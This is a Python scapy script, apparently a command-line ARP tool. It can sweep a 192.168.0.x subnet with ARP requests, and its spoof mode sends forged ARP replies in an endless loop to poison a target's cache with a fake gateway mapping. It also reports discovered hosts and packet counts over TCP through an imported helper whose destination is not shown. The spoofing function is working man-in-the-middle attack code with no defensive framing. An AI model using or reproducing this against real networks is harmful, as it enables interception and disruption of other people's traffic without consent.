from __future__ import print_function
from ipaddress import ip_address
from struct import pack
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time
import threading
from optparse import OptionParser
from sock import *

# --bcast --who-has=[ip]
# --spoof --ip=[ip] --tmac=[mac] --gateway=[gateway] --smac=[mac]

ARP_REPLY = 0x02
ADAPTER = "Ethernet"
LOCAL_IP_ADDRESS = get_if_addr(ADAPTER)
packet = None
packet_count = 1

single_broadcast = False
global_broadcast = False
spoof_mode = False
mutex = threading.Lock()

def print_usage():
    print("python arp.py --bcast --who-has=[IP]")
    print("python arp.py --ip=[ip] --tmac=[mac] --gateway=[gateway] --smac=[xx:xx:xx:xx:xx]")

parser = OptionParser()
# broadcast options
parser.add_option("-b", "--bcast", action="store_true", dest='bcast',  help="Send broadcast arp")
parser.add_option("--who-has",     action='store', dest='who_has', type='string', help="The ip we are looking for")
# spoof options
parser.add_option("--spoof",   action='store_true', dest='spoof', help="Arp spoof a specific address")
parser.add_option("--ip",      action='store', dest='ip',      type='string', help="The address of the target")
parser.add_option("--tmac",    action='store', dest='tmac',    type='string', help="The mac address of the target")
parser.add_option("--gateway", action='store', dest='gateway', type='string', help="The gateway")
parser.add_option("--smac",    action='store', dest='smac',    type='string', help="The mac address of the gateway")
(options, args) = parser.parse_args()

if (not options.spoof and not options.bcast) or (options.spoof and options.bcast):
    print_usage()
if options.spoof:
    if not options.ip or not options.gateway or not options.tmac or not options.smac:
        print_usage()
    else:
        spoof_mode = True
if options.bcast:
    if not options.who_has:
        global_broadcast = True
    else:
        single_broadcast = True

def spoof(dstip, hdst, srcip, hsrc):
    while True:
        send_packet(Ether(dst=hdst) / ARP(pdst=dstip, hwdst=hdst, psrc=srcip, hwsrc=hsrc))

def send_packet(packet):
    global packet_count
    sendp(packet, iface=ADAPTER)
    mutex.acquire()
    send_tcp_data("Packet - " + str(packet_count))
    mutex.release()
    packet_count += 1
    time.sleep(0.2)

def receive_arp(packet):
    if packet[ARP].op == ARP_REPLY:
        if "0.0.0.0" in packet.pdst or LOCAL_IP_ADDRESS in packet.pdst:
            src_ip = packet.psrc
            src_hw = packet.hwsrc
            mutex.acquire()
            send_tcp_data(src_ip + " - " + src_hw)
            mutex.release()

def receiver():
    sniff(filter="arp", iface=ADAPTER, prn=receive_arp)

if __name__ == "__main__":
    thread = threading.Thread(target=receiver, args=())
    thread.start()
    time.sleep(2)

    if single_broadcast:
        for i in range(3):
            send_packet(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=options.who_has))
    elif global_broadcast:
        for i in range(1, 256):
            send_packet(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst="192.168.0." + str(i)))
    elif spoof_mode:
        spoof(options.ip, options.tmac, options.gateway, options.smac)